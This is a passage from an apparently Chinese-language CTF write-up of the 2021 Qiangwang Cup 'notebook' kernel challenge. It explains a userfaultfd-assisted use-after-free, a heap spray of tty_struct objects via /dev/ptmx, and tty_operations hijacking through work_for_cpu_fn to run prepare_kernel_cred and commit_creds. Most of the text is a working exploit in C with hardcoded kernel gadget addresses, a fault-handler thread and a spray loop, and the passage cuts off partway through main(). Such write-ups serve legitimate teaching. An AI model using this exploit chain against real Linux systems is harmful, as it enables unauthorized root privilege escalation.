class="hljs-type">static</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">uffd_msg</span> msg;<br>    <span class="hljs-type">static</span> <span class="hljs-type">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">long</span> uffd;<br><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">uffdio_copy</span> uffdio_copy;<br>    <span class="hljs-type">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-type">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">pollfd</span> pollfd;<br>        <span class="hljs-type">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = <span class="hljs-built_in">poll</span>(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * [在这停顿.jpg]</span><br><span class="hljs-comment">         * 当 poll 返回时说明出现了缺页异常</span><br><span class="hljs-comment">         * 你可以在这里插入一些自定义的代码，比如说获取锁或者 sleep() 一类的操作</span><br><span class="hljs-comment">         * 让他在你想要的地方停顿，之后你再手动唤醒（或者就这样卡住）</span><br><span class="hljs-comment">         */</span><br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        nread = <span class="hljs-built_in">read</span>(uffd, &amp;msg, <span class="hljs-built_in">sizeof</span>(msg));<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="从2021强网杯notebook学userfaultfd和堆喷"><a href="#从2021强网杯notebook学userfaultfd和堆喷" class="headerlink" title="从2021强网杯notebook学userfaultfd和堆喷"></a>从2021强网杯notebook学userfaultfd和堆喷</h2><p>查看启动脚本发现开启了smap，smep和kaslr保护。并且开启了KPTI保护。</p>
<blockquote>
<p>过KPTI保护就可以不用过smep和smap保护，不知道为什么，这里留个坑，下次再来解释。</p>
</blockquote>
<p><img src="https://i.imgur.com/aLdZ5Jr.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="主要思路"><a href="#主要思路" class="headerlink" title="主要思路"></a><strong>主要思路</strong></h4><p>这道题的主要思路就是UAF，free掉notebook.note,但是我们还可以通过notebook.note去访问这个指针，这个过程需要用到线程竞争，为了提高竞争的成功率就要用到userfaultfd机制。释放的notebook.note的大小应该是tty_struct的大小，这样我们多次open(“&#x2F;dev&#x2F;ptmx”),就有概率申请的tty_struct被放在刚刚释放的大小为tty_struct的notebook.note中，这样通过访问notebook.note就可以UAF修改tty_struct的值从而劫持控制流bypass KPTI到用户空间拿到root权限并getshell。我们多次打开dev&#x2F;ptmx的过程就叫堆喷。</p>
<blockquote>
<p>堆喷的原理可以这样简单理解：假设我们有一个大小n的内核pool chunk A，然后释放该chunk。当我们再次申请同样大小的chunk时，就有可能又会申请到A，只是概率较低，但是如果我们大量申请同样大小的chunk，就有很大的概率又申请到A空间。</p>
</blockquote>
<p>我们可以看到noteedit中用krealloc函数，会先释放原有空间，再分配新的空间，这里我们原有空间的大小可以设为0x2e0，也就是tty_struct的大小，然后传入的newsize可以是0x1000，传入的buf可以是memset分配的匿名页，这样在copy_from_user的时候就会sleep一段时间，此时还没有修改notebook.note的指向，因此访问notebook.note还可以访问到原来的指针。<br><img src="https://i.imgur.com/BEMW0pE.png" srcset="/img/loading.gif" lazyload></p>
<p>此时大小为0x2e0大小的堆空间已经释放了，因此此时我们多次申请open(“&#x2F;dev&#x2F;ptmx”),这样就能有大概率申请到的tty_struct刚好就落在刚刚释放的堆空间里。</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">for (int i <span class="hljs-operator">=</span> <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; 0x80; i++)</span><br>        tty_fd[i] <span class="hljs-operator">=</span> open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span><span class="hljs-punctuation">,</span> O_RDWR | O_NOCTTY)<span class="hljs-comment">;</span><br>    puts(<span class="hljs-string">&quot;<span class="hljs-char escape_">\03</span>3[32m<span class="hljs-char escape_">\03</span>3[1m[+] Heap spray for tty done.<span class="hljs-char escape_">\03</span>3[0m&quot;</span>)<span class="hljs-comment">;</span><br>    sleep(<span class="hljs-number">1</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<p>接下来我们要把每个notebook.note里的数据读到用户空间然后判断是哪一个notebook.note hit到了tty_struct，但是在读的时候会有检查size，不能越界读写，因此我们还需要另起一个线程去修改notebook的size为正常大小。因为是add和edit都是读锁，因此可以多线程访问，不会阻塞。<br><img src="https://i.imgur.com/bH09Rsa.png" srcset="/img/loading.gif" lazyload></p>
<p>然后就是常规的劫持tty_operations执行ROP。当时我看其他师傅的脚本栈迁移迁移的我犯迷糊，因此推荐<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/385645268">长亭的wp</a>。前面的解法相同，只是后面不需要那么多次栈迁移以及ROP。</p>
<h4 id="work-for-cpu-fn-稳定化利用"><a href="#work-for-cpu-fn-稳定化利用" class="headerlink" title="work_for_cpu_fn 稳定化利用"></a>work_for_cpu_fn 稳定化利用</h4><p>在开启了多核支持的内核中都有这个函数，定义于 kernel&#x2F;workqueue.c 中：</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">struct</span> work_for_cpu &#123;<br>    <span class="hljs-keyword">struct</span> work_struct work;<br>    <span class="hljs-built_in">long</span> (*fn)(<span class="hljs-keyword">void</span> *);<br>    <span class="hljs-keyword">void</span> *arg;<br>    <span class="hljs-built_in">long</span> ret;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">work_for_cpu_fn</span>(<span class="hljs-params"><span class="hljs-keyword">struct</span> work_struct *work</span>)</span><br>&#123;<br>    <span class="hljs-keyword">struct</span> work_for_cpu *wfc = container_of(work, <span class="hljs-keyword">struct</span> work_for_cpu, work);<br><br>    wfc-&gt;ret = wfc-&gt;fn(wfc-&gt;arg);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>可以看到这个函数 rdi + 0x20 处作为函数指针执行，参数为 rdi + 0x28 处值，返回值存放在 rdi + 0x30 处，由此我们可以很方便地分次执行 prepare_kernel_cred 和 commit_creds，完成稳定化提权。</p>
<blockquote>
<p>这里劫持ioctl而不是write，原因是 tty_write 和 do_tty_write 操作中对此处的成员变量进行了操作，会修改rdi+0x28处的值，所以劫持ioctl。并且ctf-wiki上说ioctl的cmd值最好用233.</p>
</blockquote>
<p>而在执行ioctl的时候，rdi寄存器的值刚好是tty_struct的值，因此在（size_t）tty_struct+3的位置也就是operations的位置填入work_for_cpu_fn函数地址，然后在（size_t）tty_struct+4也就是rdi+0x20的位置填入prepare_kernel_cred函数的地址，在（size_t）tty_struct+5也就是rdi+0x28的位置填入0，也就是prepare_kernel_cred的参数，返回值放在（size_t）tty_struct+6的位置。然后调用ioctl执行prepare_kernel_cred函数，执行完后将返回值也就是（size_t）tty_struct+6的位置放入（size_t）tty_struct+5也就是参数的位置，然后（size_t）tty_struct+3的位置填入work_for_cpu_fn函数地址，然后在（size_t）tty_struct+4的位置填入commit_creds函数的地址。之后直接用户态getshell即可。</p>
<p><strong>解法一exp</strong></p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernelpwn.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTM_UNIX98_OPS 0xffffffff81e8e440</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTY_UNIX98_OPS 0xffffffff81e8e320</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810a9b40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810a9ef0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81a00929</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUSH_RDI_POP_RSP_POP_RBP_ADD_RAX_RDX_RET 0xffffffff81238d50</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RSP_RBP_POP_RBP_RET 0xffffffff8107875c</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff81007115</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RDI_RAX_POP_RBP_RET 0xffffffff81045833</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDX_RET 0xffffffff81358842</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> RET 0xffffffff81000091</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_POP_RBP_RET 0xffffffff810637d4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IRETQ 0xffffffff810338bb</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDX_POP_R12_POP_RBP_RET 0xffffffff810880c1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RSI_POP_RDI_POP_RBX_RET 0xffffffff81079c38</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RBP_RET 0xffffffff81000367</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RBX_POP_RBP_RET 0xffffffff81002141</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RAX_POP_RBX_POP_RBP_RET 0xffffffff810cadf7</span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TTY_STRUCT_SIZE 0x2e0</span><br><br><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> page_size;<br><span class="hljs-type">static</span> <span class="hljs-type">sem_t</span> sem_add, sem_edit;<br><span class="hljs-type">static</span> <span class="hljs-type">char</span> * buf; <span class="hljs-comment">// for userfaultfd</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">char</span> *page = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">uffd_msg</span> msg;<br>    <span class="hljs-type">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">long</span> uffd;<br><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">uffdio_copy</span> uffdio_copy;<br>    <span class="hljs-type">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-type">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">pollfd</span> pollfd;<br>        <span class="hljs-type">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = <span class="hljs-built_in">poll</span>(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        nread = <span class="hljs-built_in">read</span>(uffd, &amp;msg, <span class="hljs-built_in">sizeof</span>(msg));<br><br>        <span class="hljs-built_in">sleep</span>(<span class="hljs-number">100</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <br>&#123;<br>    <span class="hljs-type">size_t</span> idx;<br>    <span class="hljs-type">size_t</span> size;<br>    <span class="hljs-type">char</span> * buf;<br>&#125; Note;<br><br><span class="hljs-type">long</span> note_fd;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">noteAdd</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">char</span> * buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note note = <br>    &#123;<br>        .idx = idx,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br>    <span class="hljs-built_in">ioctl</span>(note_fd, <span class="hljs-number">0x100</span>, &amp;note);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">noteAddWrapper</span><span class="hljs-params">(<span class="hljs-type">void</span> * args)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note * note = (Note*) args;<br>    <span class="hljs-built_in">noteAdd</span>(note-&gt;idx, note-&gt;size, note-&gt;buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">noteDel</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note note = <br>    &#123;<br>        .idx = idx,<br>    &#125;;<br>    <span class="hljs-built_in">ioctl</span>(note_fd, <span class="hljs-number">0x200</span>, &amp;note);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">noteEdit</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">char</span> * buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note note = <br>    &#123;<br>        .idx = idx,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br>    <span class="hljs-built_in">ioctl</span>(note_fd, <span class="hljs-number">0x300</span>, &amp;note);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">noteEditWrapper</span><span class="hljs-params">(<span class="hljs-type">void</span> * args)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note * note = (Note*) args;<br>    <span class="hljs-built_in">noteEdit</span>(note-&gt;idx, note-&gt;size, note-&gt;buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">noteGift</span><span class="hljs-params">(<span class="hljs-type">char</span> * buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note note = <br>    &#123;<br>        .buf = buf,<br>    &#125;;<br>    <span class="hljs-built_in">ioctl</span>(note_fd, <span class="hljs-number">100</span>, &amp;note);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">evilAdd</span><span class="hljs-params">(<span class="hljs-type">void</span> * args)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">sem_wait</span>(&amp;sem_add);<br>    <span class="hljs-built_in">noteAdd</span>((<span class="hljs-type">int</span>)args, <span class="hljs-number">0x50</span>, buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">evilEdit</span><span class="hljs-params">(<span class="hljs-type">void</span> * args)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">sem_wait</span>(&amp;sem_edit);<br>    <span class="hljs-built_in">noteEdit</span>((<span class="hljs-type">int</span>)args, <span class="hljs-number">0x2000</span>, buf);<br>&#125;<br><br><span class="hljs-keyword">struct</span><br>&#123;<br>    <span class="hljs-type">void</span> * buf;<br>    <span class="hljs-type">size_t</span> size;<br>&#125; notebook[<span class="hljs-number">0x10</span>];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span> tty_fd[<span class="hljs-number">0x100</span>], tty_idx, fake_tty_ops_idx = <span class="hljs-number">-1</span>, fake_stack_idx = <span class="hljs-number">-1</span>, hit_tty = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">size_t</span> tty_data[<span class="hljs-number">0x200</span>], fake_tty_data[<span class="hljs-number">0x200</span>], tty_ops, fake_tty_ops_data[<span class="hljs-number">0x200</span>], rop[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">pthread_t</span> <span class="hljs-type">tmp_t</span>, <span class="hljs-type">add_t</span>, <span class="hljs-type">edit_t</span>;<br>    Note note;<br>    <span class="hljs-built_in">saveStatus</span>();<br>    <span class="hljs-built_in">sem_init</span>(&amp;sem_add, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">sem_init</span>(&amp;sem_edit, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    note_fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/notebook&quot;</span>, O_RDWR);<br>    buf = (<span class="hljs-type">char</span>*) <span class="hljs-built_in">mmap</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    page = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    <span class="hljs-built_in">memset</span>(page, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">0x1000</span>);<br>    page_size = <span class="hljs-built_in">sysconf</span>(_SC_PAGE_SIZE);<br><br>    <span class="hljs-built_in">registerUserFaultFd</span>(buf, <span class="hljs-number">0x1000</span>, fault_handler_thread);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>    &#123;<br>        <span class="hljs-built_in">noteAdd</span>(i, <span class="hljs-number">0x20</span>, page);<br>        <span class="hljs-built_in">noteEdit</span>(i, TTY_STRUCT_SIZE, page);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span 